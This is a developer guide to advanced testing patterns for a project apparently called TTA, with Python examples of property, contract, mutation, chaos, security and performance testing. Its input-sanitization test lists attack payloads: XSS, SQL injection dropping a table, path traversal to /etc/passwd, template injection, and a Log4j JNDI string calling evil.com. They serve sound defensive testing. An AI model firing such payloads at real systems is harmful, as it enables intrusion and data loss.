# Advanced Testing Patterns for TTA

**Version:** 1.0  
**Date:** 2025-01-31  
**Audience:** Senior developers and test architects

## Overview

This document covers advanced testing patterns, techniques, and strategies for the TTA project. It builds upon the foundation established in the [Testing Guide](TESTING_GUIDE.md) and focuses on sophisticated testing scenarios.

## Table of Contents

1. [Property-Based Testing](#property-based-testing)
2. [Contract Testing](#contract-testing)
3. [Mutation Testing](#mutation-testing)
4. [Chaos Engineering](#chaos-engineering)
5. [Security Testing](#security-testing)
6. [Performance Testing](#performance-testing)
7. [Test Data Management](#test-data-management)
8. [Advanced Mocking Strategies](#advanced-mocking-strategies)

## Property-Based Testing

Property-based testing generates random test inputs to verify that certain properties hold true across a wide range of inputs.

### Installation

```bash
uv add --dev hypothesis
```

### Basic Property Testing

```python
from hypothesis import given, strategies as st
import pytest

@given(st.text())
def test_string_reversal_property(s):
    """Test that reversing a string twice returns the original."""
    assert s == s[::-1][::-1]

@given(st.lists(st.integers()))
def test_list_sorting_property(lst):
    """Test properties of sorted lists."""
    sorted_lst = sorted(lst)
    
    # Property 1: Length is preserved
    assert len(sorted_lst) == len(lst)
    
    # Property 2: All elements are present
    assert set(sorted_lst) == set(lst)
    
    # Property 3: Result is sorted
    for i in range(len(sorted_lst) - 1):
        assert sorted_lst[i] <= sorted_lst[i + 1]
```

### Domain-Specific Property Testing

```python
from hypothesis import given, strategies as st
from src.components.therapeutic_safety.models import TherapeuticSession

# Custom strategy for therapeutic sessions
@st.composite
def therapeutic_session_strategy(draw):
    user_id = draw(st.text(min_size=1, max_size=50))
    session_type = draw(st.sampled_from(['guided', 'free_form', 'crisis']))
    duration = draw(st.integers(min_value=1, max_value=7200))  # 1 second to 2 hours
    
    return TherapeuticSession(
        user_id=user_id,
        session_type=session_type,
        duration=duration
    )

@given(therapeutic_session_strategy())
def test_session_validation_properties(session):
    """Test that all generated sessions are valid."""
    # Property: All sessions should be valid
    assert session.is_valid()
    
    # Property: Duration should be positive
    assert session.duration > 0
    
    # Property: User ID should not be empty
    assert len(session.user_id.strip()) > 0
```

### Stateful Testing

```python
from hypothesis.stateful import RuleBasedStateMachine, rule, invariant
from src.components.session_management import SessionManager

class SessionManagerStateMachine(RuleBasedStateMachine):
    def __init__(self):
        super().__init__()
        self.session_manager = SessionManager()
        self.active_sessions = set()
    
    @rule(user_id=st.text(min_size=1, max_size=20))
    def create_session(self, user_id):
        session_id = self.session_manager.create_session(user_id)
        self.active_sessions.add(session_id)
    
    @rule(session_id=st.sampled_from(lambda self: self.active_sessions or ['dummy']))
    def end_session(self, session_id):
        if session_id in self.active_sessions:
            self.session_manager.end_session(session_id)
            self.active_sessions.remove(session_id)
    
    @invariant()
    def session_count_consistency(self):
        """Active sessions count should match our tracking."""
        assert len(self.active_sessions) == self.session_manager.active_session_count()

# Run the state machine
TestSessionManager = SessionManagerStateMachine.TestCase
```

## Contract Testing

Contract testing ensures that services can communicate correctly by testing the contracts between them.

### API Contract Testing

```python
import pytest
import requests
from pact import Consumer, Provider, Like, Term

# Consumer test (Player Experience API)
@pytest.fixture(scope='session')
def pact():
    return Consumer('player_experience_api').has_pact_with(
        Provider('agent_orchestration_service')
    )

def test_get_agent_status_contract(pact):
    """Test contract for getting agent status."""
    expected_response = {
        'agent_id': Like('agent_123'),
        'status': Term(r'(active|inactive|busy)', 'active'),
        'last_seen': Like('2025-01-31T10:00:00Z'),
        'capabilities': Like(['text_generation', 'safety_monitoring'])
    }
    
    (pact
     .given('agent exists')
     .upon_receiving('a request for agent status')
     .with_request('GET', '/agents/agent_123/status')
     .will_respond_with(200, body=expected_response))
    
    with pact:
        response = requests.get('http://localhost:8080/agents/agent_123/status')
        assert response.status_code == 200
        assert response.json()['agent_id'] == 'agent_123'
```

### Database Contract Testing

```python
@pytest.mark.neo4j
def test_user_repository_contract(neo4j_driver):
    """Test that UserRepository adheres to its contract."""
    from src.repositories.user_repository import UserRepository
    
    repo = UserRepository(neo4j_driver)
    
    # Contract: create_user should return user with ID
    user_data = {'name': 'Test User', 'email': 'test@example.com'}
    user = repo.create_user(user_data)
    assert user.id is not None
    assert user.name == 'Test User'
    
    # Contract: get_user should return None for non-existent user
    non_existent = repo.get_user('non_existent_id')
    assert non_existent is None
    
    # Contract: get_user should return user for existing ID
    retrieved = repo.get_user(user.id)
    assert retrieved is not None
    assert retrieved.id == user.id
```

## Mutation Testing

Mutation testing evaluates the quality of tests by introducing small changes (mutations) to the code and checking if tests catch them.

### Installation

```bash
uv add --dev mutmut
```

### Running Mutation Tests

```bash
# Run mutation testing on specific module
mutmut run --paths-to-mutate=src/components/therapeutic_safety/

# Show mutation results
mutmut results

# Show specific mutation
mutmut show 1
```

### Mutation Testing Configuration

```toml
# pyproject.toml
[tool.mutmut]
paths_to_mutate = "src/"
backup = false
runner = "python -m pytest tests/"
tests_dir = "tests/"
```

### Improving Mutation Score

```python
# Before: Weak test
def test_calculate_risk_score():
    score = calculate_risk_score({'anxiety_level': 5})
    assert score > 0

# After: Strong test that catches mutations
def test_calculate_risk_score():
    # Test boundary conditions
    assert calculate_risk_score({'anxiety_level': 0}) == 0
    assert calculate_risk_score({'anxiety_level': 10}) == 100
    
    # Test specific calculations
    assert calculate_risk_score({'anxiety_level': 5}) == 50
    assert calculate_risk_score({'anxiety_level': 7, 'depression_level': 3}) == 70
    
    # Test edge cases
    with pytest.raises(ValueError):
        calculate_risk_score({'anxiety_level': -1})
    
    with pytest.raises(ValueError):
        calculate_risk_score({'anxiety_level': 11})
```

## Chaos Engineering

Chaos engineering tests system resilience by introducing controlled failures.

### Network Chaos Testing

```python
import pytest
from unittest.mock import patch
import requests
from requests.exceptions import ConnectionError, Timeout

@pytest.mark.integration
def test_service_resilience_to_network_failures():
    """Test that service handles network failures gracefully."""
    from src.services.external_api_service import ExternalAPIService
    
    service = ExternalAPIService()
    
    # Test connection timeout
    with patch('requests.get', side_effect=Timeout()):
        result = service.fetch_data()
        assert result is None or result.get('error') == 'timeout'
    
    # Test connection error
    with patch('requests.get', side_effect=ConnectionError()):
        result = service.fetch_data()
        assert result is None or result.get('error') == 'connection_failed'
    
    # Test partial failure (some requests succeed)
    call_count = 0
    def intermittent_failure(*args, **kwargs):
        nonlocal call_count
        call_count += 1
        if call_count % 3 == 0:
            raise ConnectionError()
        return Mock(status_code=200, json=lambda: {'data': 'success'})
    
    with patch('requests.get', side_effect=intermittent_failure):
        results = []
        for _ in range(10):
            result = service.fetch_data()
            results.append(result)
        
        # Should have some successes and some failures
        successes = [r for r in results if r and r.get('data') == 'success']
        failures = [r for r in results if r is None or 'error' in r]
        
        assert len(successes) > 0
        assert len(failures) > 0
```

### Database Chaos Testing

```python
@pytest.mark.neo4j
def test_database_resilience(neo4j_driver):
    """Test resilience to database issues."""
    from src.repositories.user_repository import UserRepository
    
    repo = UserRepository(neo4j_driver)
    
    # Test with slow queries (simulate database load)
    with patch.object(neo4j_driver, 'session') as mock_session:
        mock_session.return_value.__enter__.return_value.run.side_effect = lambda q: time.sleep(2)
        
        start_time = time.time()
        result = repo.get_user_with_timeout('user_123', timeout=1.0)
        elapsed = time.time() - start_time
        
        # Should timeout and return None
        assert result is None
        assert elapsed < 1.5  # Should not wait much longer than timeout
```

## Security Testing

### Input Validation Testing

```python
@pytest.mark.parametrize("malicious_input", [
    "<script>alert('xss')</script>",
    "'; DROP TABLE users; --",
    "../../../etc/passwd",
    "{{7*7}}",  # Template injection
    "${jndi:ldap://evil.com/a}",  # Log4j injection
])
def test_input_sanitization(malicious_input):
    """Test that malicious inputs are properly sanitized."""
    from src.utils.input_sanitizer import sanitize_input
    
    sanitized = sanitize_input(malicious_input)
    
    # Should not contain dangerous patterns
    assert '<script>' not in sanitized.lower()
    assert 'drop table' not in sanitized.lower()
    assert '../' not in sanitized
    assert '{{' not in sanitized
    assert '${' not in sanitized
```

### Authentication Testing

```python
def test_jwt_token_validation():
    """Test JWT token validation security."""
    from src.auth.jwt_handler import JWTHandler
    
    handler = JWTHandler()
    
    # Test with expired token
    expired_token = handler.create_token({'user_id': '123'}, expires_in=-3600)
    with pytest.raises(TokenExpiredError):
        handler.validate_token(expired_token)
    
    # Test with tampered token
    valid_token = handler.create_token({'user_id': '123'})
    tampered_token = valid_token[:-5] + 'XXXXX'
    with pytest.raises(InvalidTokenError):
        handler.validate_token(tampered_token)
    
    # Test with wrong algorithm
    with patch('jwt.decode', side_effect=InvalidAlgorithmError()):
        with pytest.raises(InvalidTokenError):
            handler.validate_token(valid_token)
```

### Authorization Testing

```python
@pytest.mark.parametrize("user_role,endpoint,expected_status", [
    ('admin', '/admin/users', 200),
    ('user', '/admin/users', 403),
    ('therapist', '/sessions/create', 200),
    ('user', '/sessions/create', 403),
    ('guest', '/public/info', 200),
    ('guest', '/sessions/list', 401),
])
def test_role_based_access_control(user_role, endpoint, expected_status):
    """Test that RBAC is properly enforced."""
    from src.auth.rbac import check_permission
    
    user = create_test_user(role=user_role)
    has_permission = check_permission(user, endpoint)
    
    if expected_status == 200:
        assert has_permission
    else:
        assert not has_permission
```

## Performance Testing

### Load Testing

```python
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor

@pytest.mark.performance
def test_concurrent_user_load():
    """Test system performance under concurrent load."""
    from src.services.user_service import UserService
    
    service = UserService()
    
    def create_user_task(user_id):
        return service.create_user({
            'id': f'user_{user_id}',
            'name': f'User {user_id}',
            'email': f'user{user_id}@example.com'
        })
    
    # Test with 100 concurrent users
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(create_user_task, i) for i in range(100)]
        results = [future.result() for future in futures]
    
    elapsed_time = time.time() - start_time
    
    # Performance assertions
    assert elapsed_time < 10.0  # Should complete within 10 seconds
    assert len(results) == 100
    assert all(result.id for result in results)  # All users created successfully
```

### Memory Profiling

```python
import psutil
import os

@pytest.mark.performance
def test_memory_usage_under_load():
    """Test memory usage doesn't grow excessively."""
    from src.services.data_processor import DataProcessor
    
    process = psutil.Process(os.getpid())
    initial_memory = process.memory_info().rss
    
    processor = DataProcessor()
    
    # Process large amount of data
    for i in range(1000):
        large_data = {'data': 'x' * 1000, 'id': i}
        processor.process(large_data)
    
    final_memory = process.memory_info().rss
    memory_increase = final_memory - initial_memory
    
    # Memory increase should be reasonable (less than 50MB)
    assert memory_increase < 50 * 1024 * 1024
```

## Test Data Management

### Test Data Builders

```python
from dataclasses import dataclass
from typing import Optional
from datetime import datetime

@dataclass
class TestUserBuilder:
    """Builder for creating test users with flexible configuration."""
    
    name: str = "Test User"
    email: str = "test@example.com"
    role: str = "user"
    active: bool = True
    created_at: Optional[datetime] = None
    
    def with_name(self, name: str) -> 'TestUserBuilder':
        self.name = name
        return self
    
    def with_email(self, email: str) -> 'TestUserBuilder':
        self.email = email
        return self
    
    def with_role(self, role: str) -> 'TestUserBuilder':
        self.role = role
        return self
    
    def inactive(self) -> 'TestUserBuilder':
        self.active = False
        return self
    
    def created_at_time(self, created_at: datetime) -> 'TestUserBuilder':
        self.created_at = created_at
        return self
    
    def build(self) -> dict:
        return {
            'name': self.name,
            'email': self.email,
            'role': self.role,
            'active': self.active,
            'created_at': self.created_at or datetime.now()
        }

# Usage
def test_user_creation():
    user_data = (TestUserBuilder()
                 .with_name("John Doe")
                 .with_role("admin")
                 .build())
    
    user = create_user(user_data)
    assert user.name == "John Doe"
    assert user.role == "admin"
```

### Test Data Factories with Faker

```python
from faker import Faker
import pytest

fake = Faker()

@pytest.fixture
def user_factory():
    """Factory for generating realistic test users."""
    def _create_user(**overrides):
        defaults = {
            'name': fake.name(),
            'email': fake.email(),
            'phone': fake.phone_number(),
            'address': fake.address(),
            'birth_date': fake.date_of_birth(minimum_age=18, maximum_age=80),
            'registration_date': fake.date_time_this_year(),
        }
        defaults.update(overrides)
        return defaults
    return _create_user

def test_with_realistic_data(user_factory):
    """Test with realistic generated data."""
    user_data = user_factory(name="Specific Name")
    
    # Data should be realistic but controllable
    assert user_data['name'] == "Specific Name"
    assert '@' in user_data['email']
    assert len(user_data['phone']) > 5
```

## Advanced Mocking Strategies

### Context-Aware Mocking

```python
from contextlib import contextmanager
from unittest.mock import patch, MagicMock

@contextmanager
def mock_external_services():
    """Context manager for mocking all external services."""
    with patch('src.external.api_client') as mock_api, \
         patch('src.external.email_service') as mock_email, \
         patch('src.external.sms_service') as mock_sms:
        
        # Configure mocks
        mock_api.get.return_value = {'status': 'success'}
        mock_email.send.return_value = True
        mock_sms.send.return_value = {'message_id': '12345'}
        
        yield {
            'api': mock_api,
            'email': mock_email,
            'sms': mock_sms
        }

def test_user_registration_flow():
    """Test complete user registration with mocked external services."""
    with mock_external_services() as mocks:
        result = register_user({
            'name': 'Test User',
            'email': 'test@example.com',
            'phone': '+1234567890'
        })
        
        assert result['success'] is True
        mocks['email'].send.assert_called_once()
        mocks['sms'].send.assert_called_once()
```

### Smart Mocks with State

```python
class StatefulMock:
    """Mock that maintains state across calls."""
    
    def __init__(self):
        self.call_count = 0
        self.state = {}
    
    def api_call(self, endpoint, data=None):
        self.call_count += 1
        
        if endpoint == '/users' and data:
            user_id = f"user_{self.call_count}"
            self.state[user_id] = data
            return {'id': user_id, **data}
        
        elif endpoint.startswith('/users/'):
            user_id = endpoint.split('/')[-1]
            return self.state.get(user_id)
        
        return None

@pytest.fixture
def stateful_api_mock():
    return StatefulMock()

def test_user_crud_operations(stateful_api_mock):
    """Test CRUD operations with stateful mock."""
    with patch('src.api.client.post', stateful_api_mock.api_call), \
         patch('src.api.client.get', stateful_api_mock.api_call):
        
        # Create user
        user = create_user({'name': 'Test User'})
        assert user['id'].startswith('user_')
        
        # Retrieve user
        retrieved = get_user(user['id'])
        assert retrieved['name'] == 'Test User'
```

---

**Next**: See [Performance Testing Guide](PERFORMANCE_TESTING.md) for detailed performance testing strategies and [Security Testing Guide](SECURITY_TESTING.md) for comprehensive security testing approaches.
